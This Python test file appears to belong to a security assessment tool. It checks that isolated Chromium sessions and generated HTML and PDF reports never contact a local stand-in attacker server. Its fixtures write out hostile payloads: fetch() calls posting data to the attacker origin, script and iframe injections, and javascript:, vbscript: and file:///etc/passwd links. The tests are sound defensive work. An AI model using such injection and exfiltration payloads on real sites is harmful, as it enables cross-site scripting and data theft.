"""Real Chromium and PDF artefact attacks, with a receiving attacker HTTP server."""

import json
from html.parser import HTMLParser
from types import SimpleNamespace

import fitz
import pytest
from playwright.sync_api import Error as PlaywrightError
from playwright.sync_api import sync_playwright
from test_report_compact import scenario

from ams_assess import network, report
from ams_assess.browser_safety import CONTEXT_OPTIONS, LAUNCH_OPTIONS, isolate_context
from ams_assess.models import Context, create_run_dir
from ams_assess.modules import browser as collector


def test_browser_options_are_ephemeral_and_deny_ambient_state():
    calls = {}

    class Session:
        def route(self, *args):
            calls["route"] = args

        def route_web_socket(self, *args):
            calls["websocket"] = args

    def context(**kwargs):
        calls["context"] = kwargs
        return Session()

    isolate_context(SimpleNamespace(new_context=context))
    assert calls["context"] == CONTEXT_OPTIONS
    assert calls["context"]["storage_state"] == {"cookies": [], "origins": []}
    assert calls["context"]["permissions"] == []
    assert calls["context"]["accept_downloads"] is False
    assert calls["context"]["service_workers"] == "block"
    assert calls["context"]["ignore_https_errors"] is False
    assert calls["route"][0] == calls["websocket"][0] == "**/*"
    assert "--disable-extensions" in LAUNCH_OPTIONS["args"]
    assert not any("user-data-dir" in arg for arg in LAUNCH_OPTIONS["args"])


def test_browser_subresources_redirects_websockets_workers_and_writes_never_hit_attacker(
    http_server,
    monkeypatch,
):
    attacker = http_server()
    evil = attacker.origin
    content = f"""<html><body>Fixture
      <img src='{evil}/image'><iframe src='{evil}/frame'></iframe>
      <script src='{evil}/script'></script><link rel='stylesheet' href='{evil}/style'>
      <style>body{{background-image:url('{evil}/css')}}</style><img src='/redirect'>
      <script>
        fetch('{evil}/get').catch(()=>{{}});
        fetch('{evil}/write',{{method:'POST',body:'FAKE'}}).catch(()=>{{}});
        const ws = new WebSocket('{evil.replace("http:", "ws:")}/socket');
        ws.onclose = () => {{ window.wsClosed = true; }};
        navigator.serviceWorker.register('/worker.js').catch(()=>{{}});
        document.cookie = 'FAKE_COOKIE=secret';
        fetch('/check-cookie').catch(()=>{{}});
      </script></body></html>""".encode()

    def respond(request):
        if request["path"] == "/redirect":
            return 302, {"Location": evil + "/redirected"}, b""
        return 200, {"Content-Type": "text/html", "Set-Cookie": "REMOTE_COOKIE=FAKE"}, content

    fixture = http_server(respond)
    monkeypatch.setattr(network, "_fixture_origins", frozenset({fixture.origin}))
    with sync_playwright() as p:
        browser = p.chromium.launch(**LAUNCH_OPTIONS)
        try:
            context = isolate_context(browser)
            assert context.cookies() == []
            page = context.new_page()
            page.goto(fixture.origin, wait_until="networkidle")
            assert "Fixture" in page.inner_text("body")
            page.wait_for_function("window.wsClosed === true")
            assert all(r["path"] != "/worker.js" for r in fixture.received)
            assert any(r["path"] == "/check-cookie" for r in fixture.received)
            assert all("Cookie" not in r["headers"] for r in fixture.received)
            context.close()
            fresh = isolate_context(browser)
            assert fresh.cookies() == []
            fresh.close()
        finally:
            browser.close()
    assert attacker.received == []


@pytest.mark.parametrize("resource", ["document", "image", "script", "stylesheet", "iframe"])
def test_browser_validates_every_redirect_hop(http_server, monkeypatch, resource):
    attacker = http_server()
    second = http_server(lambda request: (302, {"Location": attacker.origin}, b""))
    markup = {
        "image": "<img src='/resource'>",
        "script": "<script src='/resource'></script>",
        "stylesheet": "<link rel='stylesheet' href='/resource'>",
        "iframe": "<iframe src='/resource'></iframe>",
    }

    def respond(request):
        if resource == "document" or request["path"] == "/resource":
            return 302, {"Location": second.origin}, b""
        return 200, {"Content-Type": "text/html"}, markup[resource].encode()

    first = http_server(respond)
    monkeypatch.setattr(network, "_fixture_origins", frozenset({first.origin, second.origin}))
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(**LAUNCH_OPTIONS)
        try:
            page = isolate_context(browser).new_page()
            try:
                page.goto(first.origin, wait_until="networkidle")
            except PlaywrightError:
                pass
        finally:
            browser.close()
    assert len(first.received) == (1 if resource == "document" else 2)
    assert len(second.received) == 1
    assert attacker.received == []


def test_browser_safe_redirects_strip_cookies_and_preserve_final_url(http_server, monkeypatch):
    final = http_server(lambda request: (200, {"Content-Type": "text/html"}, b"Safe destination"))
    first = http_server(
        lambda request: (
            302,
            {"Location": final.origin + "/", "Set-Cookie": "FAKE_SECRET=canary; Path=/"},
            b"",
        )
    )
    monkeypatch.setattr(network, "_fixture_origins", frozenset({first.origin, final.origin}))
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(**LAUNCH_OPTIONS)
        try:
            page = isolate_context(browser).new_page()
            response = page.goto(first.origin, wait_until="networkidle")
            assert response is not None
            assert response.headers["x-ams-resolved-url"] == final.origin + "/"
            assert "Safe destination" in page.inner_text("body")
        finally:
            browser.close()
    assert len(first.received) == len(final.received) == 1
    assert "Cookie" not in final.received[0]["headers"]


def test_collector_does_not_attribute_redirected_document_to_original_url(
    tmp_path,
    http_server,
    monkeypatch,
):
    final = http_server(lambda request: (200, {"Content-Type": "text/html"}, b"Safe destination"))
    first = http_server(lambda request: (302, {"Location": final.origin + "/"}, b""))
    monkeypatch.setattr(network, "_fixture_origins", frozenset({first.origin, final.origin}))
    tools = tmp_path / "tools"
    tools.mkdir()
    (tools / "axe.min.js").touch()
    target = first.origin + "/"
    context = Context(
        "synthetic",
        "Synthetic",
        target,
        {"technical"},
        set(),
        {},
        create_run_dir(tmp_path, "synthetic"),
        tools,
        pages=[target],
    )
    result = collector.run(context)
    assert result.status == "error"
    unavailable = [
        item for item in result.evidence if item.description == "Browser page load unavailable"
    ]
    assert len(unavailable) == 2
    assert all(item.data["redirected"] for item in unavailable)
    assert all(item.data["final_url"] == final.origin + "/" for item in unavailable)


class Tags(HTMLParser):
    def __init__(self):
        super().__init__()
        self.nodes = []

    def handle_starttag(self, tag, attrs):
        self.nodes.append((tag, dict(attrs)))


def test_untrusted_markdown_html_and_pdf_have_no_active_remote_resources(
    tmp_path,
    http_server,
):
    attacker = http_server()
    evil = attacker.origin
    content = f"""# Synthetic report
Untrusted evidence <script>fetch('{evil}/script')</script>
<iframe src='{evil}/iframe'></iframe><object data='{evil}/object'></object>
<embed src='{evil}/embed'><style>body{{background:url('{evil}/css')}}</style>
<img src='{evil}/raw-image' onerror='alert(1)'>
![image]({evil}/markdown-image)
[unsafe](javascript:alert%281%29) [data](data:text/html,test)
[vb](vbscript:msgbox%281%29) [file](file:///etc/passwd)
[entity](jav&#x61;script:alert%281%29) [encoded](javascript%3Aalert%281%29)
[good]({evil}/safe-link) [mail](mailto:fixture@example.test) [relative](./report.md)
"""
    report.write_outputs(tmp_path, content, {"html", "pdf"})
    document = (tmp_path / "report.html").read_text()
    parsed = Tags()
    parsed.feed(document)
    assert not {"img", "script", "iframe", "object", "embed", "link"}.intersection(
        tag for tag, _ in parsed.nodes
    )
    links = [attrs["href"] for tag, attrs in parsed.nodes if tag == "a"]
    assert links == [evil + "/safe-link", "mailto:fixture@example.test", "./report.md"]
    assert "script-src 'none'" in document and "connect-src 'none'" in document
    assert "&lt;script&gt;" in document
    with fitz.open(tmp_path / "report.pdf") as pdf:
        text = "".join(page.get_text() for page in pdf)
        assert "Synthetic report" in text and "Untrusted evidence" in text
        for page in pdf:
            for link in page.get_links():
                assert not link.get("uri", "").startswith(("javascript:", "data:", "file:"))
    # Open the generated artefact in an ordinary browser, without collector interception.
    with sync_playwright() as p:
        browser = p.chromium.launch(**LAUNCH_OPTIONS)
        try:
            page = browser.new_page()
            page.goto((tmp_path / "report.html").as_uri(), wait_until="networkidle")
            assert page.locator("h1").inner_text() == "Synthetic report"
        finally:
            browser.close()
    assert attacker.received == []


def test_pdf_context_stays_offline_even_if_sanitizer_regresses(tmp_path, http_server, monkeypatch):
    attacker = http_server()
    monkeypatch.setattr(
        report,
        "markdown_html",
        lambda _: (
            f"<h1>Offline PDF</h1><img src='{attacker.origin}/pdf-image'>"
            f"<iframe src='{attacker.origin}/frame'></iframe>"
            f"<script>fetch({json.dumps(attacker.origin + '/script')})</script>"
        ),
    )
    report.write_outputs(tmp_path, "Fixture", {"pdf"})
    with fitz.open(tmp_path / "report.pdf") as pdf:
        assert "Offline PDF" in pdf[0].get_text()
    assert attacker.received == []


def test_ai_and_evidence_values_are_escaped_through_report_template(tmp_path, http_server):
    attacker = http_server()
    hostile = (
        f"<script>fetch('{attacker.origin}/secret')</script> "
        f"![remote]({attacker.origin}/image) <iframe src='{attacker.origin}/frame'></iframe>"
    )
    data, evidence = scenario()
    data["customer_name"] = hostile
    data["ai"]["executive_summary"] = hostile
    data["findings"][0].update(title=hostile, detail=hostile, recommendation=hostile)
    evidence[0].description = hostile
    content = report.render_markdown(data, evidence)
    report.write_outputs(tmp_path, content, {"html", "pdf"})
    parsed = Tags()
    parsed.feed((tmp_path / "report.html").read_text())
    assert all(tag not in {"script", "img", "iframe"} for tag, _ in parsed.nodes)
    with fitz.open(tmp_path / "report.pdf") as pdf:
        assert "fetch" in "".join(page.get_text() for page in pdf)
    assert attacker.received == []


def test_speculative_preconnect_prefetch_and_hover_never_open_blocked_sockets(
    http_server, monkeypatch
):
    import socket
    import threading
    import time

    # Raw TCP trap: records connections that never send an HTTP request (preconnects).
    trap = socket.socket()
    trap.bind(("127.0.0.1", 0))
    trap.listen(8)
    trap.settimeout(0.2)
    port = trap.getsockname()[1]
    accepted, stop = [], threading.Event()

    def accept():
        while not stop.is_set():
            try:
                connection, _ = trap.accept()
            except OSError:
                continue
            accepted.append(connection.recv(64))
            connection.close()

    thread = threading.Thread(target=accept, daemon=True)
    thread.start()
    evil = f"http://127.0.0.1:{port}"
    content = f"""<html><head><link rel=preconnect href='{evil}'>
      <link rel=dns-prefetch href='http://localhost:{port}'>
      <link rel=prefetch href='{evil}/prefetch'><link rel=preload as=image href='{evil}/p'>
      </head><body>Fixture<a href='{evil}/hover'>hover</a></body></html>""".encode()
    fixture = http_server(lambda r: (200, {"Content-Type": "text/html"}, content))
    monkeypatch.setattr(network, "_fixture_origins", frozenset({fixture.origin}))
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(**LAUNCH_OPTIONS)
            try:
                page = isolate_context(browser).new_page()
                page.goto(fixture.origin, wait_until="networkidle")
                page.hover("a")
                time.sleep(1)
            finally:
                browser.close()
    finally:
        stop.set()
        thread.join(5)
        trap.close()
    assert accepted == []


def test_every_chromium_context_in_product_is_isolated_and_non_persistent():
    import re
    from pathlib import Path

    root = Path(__file__).resolve().parents[1] / "ams_assess"
    for path in root.rglob("*.py"):
        text = path.read_text()
        assert "launch_persistent_context" not in text, path.name
        assert "user_data_dir" not in text and "user-data-dir" not in text, path.name
        if path.name != "browser_safety.py":
            # Contexts/pages are only created through isolate_context().
            assert not re.search(r"\.new_context\(|browser\.new_page\(", text), path.name
        for launch in re.findall(r"chromium\.launch\(([^)]*)\)", text):
            assert "**LAUNCH_OPTIONS" in launch, path.name
